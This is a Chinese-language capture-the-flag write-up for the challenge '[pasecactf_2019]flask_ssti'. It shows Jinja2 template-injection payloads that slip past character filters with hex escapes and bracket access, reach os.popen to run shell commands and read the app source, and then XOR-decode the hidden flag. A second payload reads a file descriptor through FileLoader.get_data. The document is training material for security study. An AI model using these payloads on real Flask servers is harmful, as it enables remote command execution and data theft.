---
title: '[pasecactf_2019]flask_ssti'
date: 2024-09-06 20:48:24
tags: ssti
categories: 刷题笔记
---

### [pasecactf_2019]flask_ssti

![image-20240906205453754](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409062054816.png)

下划线被禁用了

我们用16进制代替，使用\x5f

<!--more-->

![image-20240906221813927](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409062218030.png)

点被禁用了

我们用[]代替

![image-20240908151036146](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409081510273.png)

単引号被禁了

我们用双引号代替

```
我们执行{{()["\x5f\x5fclass\x5f\x5f"]}} 相当于执行{{()."__class\_\_"}}

![image-20240908152922896](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409081529962.png)
```

```
我们执行{{()["\\x5f\\x5fclass\\x5f\\x5f"]\["\x5f\x5fbases\x5f\x5f"][0]}},相当于执行{{()."\_\_class\_\_"."\_\_bases__"[0]}}

我们执行{{()["\x5f\x5fclass\x5f\x5f"]\["\x5f\x5fbases\x5f\x5f"][0]\["\x5f\x5fsubclasses\x5f\x5f"]()}}
```



```
{{()."__class__"."__bases__"[0]."__subclasses__"()[59]}}
```

我们寻找可用类

```
import json

a = """
"""

num = 0
allList = []

result = ""
for i in a:
    if i == ">":
        result += i
        allList.append(result)
        result = ""
    elif i == "\n" or i == ",":
        continue
    else:
        result += i

for k, v in enumerate(allList):
    if "os._wrap_close" in v:
        print(str(k) + "--->" + v)

```

![image-20240908154502121](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409081545273.png)

os._wrap_close在127号位上

```
{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[127]}}
```

这个类里有发现有popen，open，system这些方法

我们执行whoami

```
{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("whoami")["read"]()}}

```

![image-20240908154735484](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409081547507.png)

成功执行

我们执行ls，看看有没有flag

```
{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"](“ls")["read"]()}}

```

![image-20240908154840815](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409081548834.png)

没有找到，那我们访问app.py看看

```
{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"](“cat ap*")["read"]()}}
```

得到文件源码

![image-20240908154917966](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409081549091.png)

```
import random
from flask import Flask, render_template_string, render_template, request
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'folow @osminogka.ann on instagram =)'

#Tiaonmmn don't remember to remove this part on deploy so nobody will solve that hehe
'''
def encode(line, key, key2):
    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))

app.config['flag'] = encode('', 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')
'''

def encode(line, key, key2):
    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))

file = open("/app/flag", "r")
flag = file.read()
flag = flag[:42]

app.config['flag'] = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')
flag = ""

os.remove("/app/flag")

```

代码吧/app/flag给删了，但它加密完成的flag已经存在config里面

而他加密的模式又是异或，所以他的加密函数和解密函数是相同的

先找找加密后的flag吧

![image-20240908155216368](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409081552419.png)

```
-M7\x10w@d94\x02!`-\x0eL\x0c;\x07(DKO\r\x17!2R4\x02\rO\x0bsT#-\x1c`@Z\x1dG

```

```
def encode(line,key,key2):
    return ''.join(chr(x^ord(line[x])^ord(key[::-1][x])^ord(key2[x])) for x in range(len(line)))
flag='-M7\x10w@d94\x02!`-\x0eL\x0c;\x07(DKO\r\x17!2R4\x02\rO\x0bsT#-\x1c`@Z\x1dG'
flag = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')
print(flag)
```



得到flag![image-20240908155740065](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409081557120.png)



解法2：

用_frozen_importlib_external.FileLoader这个类

然后用get_data读取/proc/self/fd/3

```
{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}

```

